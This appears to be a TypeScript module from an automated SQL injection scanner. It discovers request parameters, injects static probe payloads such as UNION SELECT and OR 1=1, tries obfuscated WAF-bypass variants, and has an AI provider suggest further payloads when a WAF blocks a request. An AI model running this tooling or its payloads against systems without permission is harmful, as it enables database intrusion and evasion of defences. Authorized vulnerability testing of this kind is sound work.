import { Job } from 'bullmq';
import { PrismaClient, Severity, VulnerabilityType } from '@prisma/client';
import { URL } from 'url';
import { AIProvider, AIContext } from '../../services/ai-provider';
import { getCachedPayload, cachePayload } from '../../services/ai-cache';
import { ALL_SQL_ERROR_SIGNATURES } from './signatures';
import { executeRequest, delay, COMMON_FALLBACK_PARAMS, recordVulnerability, detectWaf } from './common';
import { ParameterDiscovery, InjectionPoint } from './parameter-discovery';
import { WafBypassEngine } from './waf-bypass';

const MAX_AI_ATTEMPTS = 5;

const INTELLIGENCE_PROBE_PAYLOADS = [
    "'", '"', "`", "\\", "1'", '1"', "1'\"",
    "1' OR '1'='1", "1' AND 1=1", "1' OR 1=1--",
    "1' UNION SELECT NULL--", "1' UNION SELECT 1,2,3--",
    "1' AND 1=CAST(1 AS int)--"
];

export async function executeInBandAttack(job: Job, prisma: PrismaClient): Promise<boolean> {
    const { targetUrl, scanId } = job.data;
    console.log('[Vector 1] 🚀 Starting In-Band Attack (Hybrid AI-Driven + WAF Bypass)...');

    let foundVulnerability = false;
    let baselineLength = 0;
    let initialResponseBody = '';

    // 1. Baseline & Discovery
    try {
        const res = await executeRequest(targetUrl);
        baselineLength = res.responseLength;
        initialResponseBody = res.responseBody;
    } catch (e) {
        // Ignore network errors
    }

    // 2. Discover Parameters (GET, POST, JSON)
    console.log('[Vector 1] 🔍 Discovering parameters...');
    const discoveredPoints = ParameterDiscovery.discover(targetUrl, initialResponseBody);

    // Add fallback params if not found
    for (const param of COMMON_FALLBACK_PARAMS) {
        if (!discoveredPoints.find(p => p.name === param)) {
            discoveredPoints.push({
                type: 'GET',
                name: param,
                value: '1',
                url: targetUrl,
                method: 'GET'
            });
        }
    }

    console.log(`[Vector 1] 🎯 Found ${discoveredPoints.length} injection points.`);

    // 3. Attack Loop
    for (const point of discoveredPoints) {
        console.log(`\n[Vector 1] 🎯 Testing ${point.type} Parameter: [${point.name}] on ${point.url}`);

        // Phase 1: Blitzkrieg (Fast Static Scan)
        const blitzResult = await runBlitzkriegScan(point, scanId, prisma);
        if (blitzResult) {
            foundVulnerability = true;
            continue;
        }

        // Phase 2: AI Grandmaster (Autonomous Scan)
        console.log(`[Vector 1] 🧠 Escalating to AI for parameter '${point.name}'...`);
        const aiResult = await runAiScan(point, baselineLength, scanId, prisma);
        if (aiResult) {
            foundVulnerability = true;
        }
    }

    return foundVulnerability;
}

async function runBlitzkriegScan(point: InjectionPoint, scanId: string, prisma: PrismaClient): Promise<boolean> {
    for (const payload of INTELLIGENCE_PROBE_PAYLOADS) {
        try {
            const result = await injectPayload(point, payload);

            // WAF Detection & Bypass Attempt
            if (detectWaf(result.responseBody, result.status)) {
                console.log(`[Vector 1] 🛡️ WAF Detected! Attempting bypass for static payload...`);
                const bypassPayloads = WafBypassEngine.generateBypassPayloads(payload);

                // Try top 3 bypasses to save time
                for (const bypass of bypassPayloads.slice(0, 3)) {
                    const bypassResult = await injectPayload(point, bypass.obfuscated);
                    if (checkSuccess(bypassResult.responseBody)) {
                        await reportVuln(prisma, scanId, point, bypass.obfuscated, 'WAF Bypass + Static', bypassResult.responseBody);
                        return true;
                    }
                }
            }

            if (checkSuccess(result.responseBody)) {
                await reportVuln(prisma, scanId, point, payload, 'Static Blitzkrieg', result.responseBody);
                return true;
            }
        } catch (e) {
            // Ignore errors
        }
    }
    return false;
}

async function runAiScan(point: InjectionPoint, baselineLength: number, scanId: string, prisma: PrismaClient): Promise<boolean> {
    let previousResult = `Initial Scan State. Baseline Length: ${baselineLength}. Target: ${point.method} ${point.url} param=${point.name}.`;
    let attempt = 0;

    while (attempt < MAX_AI_ATTEMPTS) {
        attempt++;

        const context: AIContext = {
            vector: 'in-band',
            parameter: point.name,
            targetUrl: point.url,
            attemptNumber: attempt
        };

        let aiDecision = await getCachedPayload(previousResult, context);

        if (!aiDecision) {
            try {
                const providerResponse = await AIProvider.getPayload(previousResult, context);

                // Only cache if we got a valid decision
                if (providerResponse) {
                    // Convert AIResponse to CachedPayload (add cachedAt)
                    aiDecision = {
                        ...providerResponse,
                        cachedAt: Date.now()
                    };
                    await cachePayload(previousResult, context, aiDecision);
                }
            } catch (error) {
                console.error(`[Vector 1] AI Error:`, error);
                break;
            }
        }

        if (!aiDecision || aiDecision.finished || !aiDecision.payload) {
            console.log(`[Vector 1] 🛑 AI decided to stop scanning '${point.name}'.`);
            break;
        }

        const payload = aiDecision.payload;
        console.log(`[Vector 1] 🤖 AI Suggests (Try ${attempt}): ${payload}`);

        const result = await injectPayload(point, payload);

        // WAF Handling in AI Loop
        if (detectWaf(result.responseBody, result.status)) {
            previousResult = `WAF BLOCKED payload "${payload}". Status: ${result.status}. Suggest using encoding or obfuscation.`;
        } else if (checkSuccess(result.responseBody)) {
            await reportVuln(prisma, scanId, point, payload, `AI-Driven (${aiDecision.reasoning})`, result.responseBody);
            return true;
        } else {
            previousResult = `Payload Tested: "${payload}" | Status: ${result.status} | Len: ${result.responseLength} | No Error Detected.`;
        }

        await delay(500);
    }

    return false;
}

// Helper to inject payload based on point type (GET/POST)
async function injectPayload(point: InjectionPoint, payload: string) {
    const config: any = { method: point.method };
    let url = point.url;

    if (point.type === 'GET') {
        const urlObj = new URL(point.url);
        urlObj.searchParams.set(point.name, payload);
        url = urlObj.toString();
    } else if (point.type === 'POST' || point.type === 'JSON') {
        if (point.contentType === 'application/json') {
            config.data = { [point.name]: payload }; // Simplified JSON injection
        } else {
            // Form URL Encoded
            const params = new URLSearchParams();
            params.append(point.name, payload);
            config.data = params.toString();
        }
    }

    return await executeRequest(url, config);
}

function checkSuccess(body: string): boolean {
    return ALL_SQL_ERROR_SIGNATURES.some(sig => body.toLowerCase().includes(sig));
}

async function reportVuln(prisma: PrismaClient, scanId: string, point: InjectionPoint, payload: string, technique: string, body: string) {
    const signature = ALL_SQL_ERROR_SIGNATURES.find(sig => body.toLowerCase().includes(sig));
    console.log(`[Vector 1] ✅ Vulnerability Confirmed! (${technique})`);

    const proof = `
        Type: ${point.type} Parameter
        Parameter: ${point.name}
        Payload: ${payload}
        Technique: ${technique}
        Signature Found: ${signature}
        URL: ${point.url}
    `.trim();

    await recordVulnerability(
        prisma,
        scanId,
        VulnerabilityType.SQL_INJECTION,
        Severity.CRITICAL,
        `SQL Injection detected in ${point.type} parameter '${point.name}'`,
        proof
    );
}
